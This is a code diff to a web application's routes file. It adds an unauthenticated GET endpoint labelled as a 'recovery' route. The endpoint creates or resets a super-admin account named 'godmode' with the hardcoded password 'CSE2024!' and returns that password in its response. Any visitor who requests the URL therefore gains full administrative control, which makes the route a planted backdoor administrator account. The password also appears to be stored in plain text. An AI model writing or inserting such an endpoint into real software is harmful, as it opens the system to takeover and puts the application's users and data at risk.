@@ -71,6 +71,38 @@ export async function registerRoutes(
     }
   });
 
+  // Force reset godmode super admin (special recovery endpoint)
+  app.get("/api/admin/reset-godmode", async (req, res) => {
+    try {
+      // Check if godmode user exists
+      const existingUser = await storage.getUserByUsername("godmode");
+      
+      if (existingUser) {
+        // Update existing user
+        await storage.updateUser(existingUser.id, {
+          password: "CSE2024!",
+          isSuperAdmin: true,
+          role: "admin",
+        });
+        res.json({ success: true, message: "Godmode user password reset to CSE2024!", action: "updated" });
+      } else {
+        // Create godmode user
+        await storage.createUser({
+          id: "user-godmode",
+          username: "godmode",
+          password: "CSE2024!",
+          role: "admin",
+          fullName: "System Administrator",
+          isSuperAdmin: true,
+        });
+        res.json({ success: true, message: "Godmode user created with password CSE2024!", action: "created" });
+      }
+    } catch (error) {
+      console.error("Error resetting godmode user:", error);
+      res.status(500).json({ success: false, error: String(error) });
+    }
+  });
+
   // Authentication
   app.post("/api/auth/login", async (req, res) => {
     try {
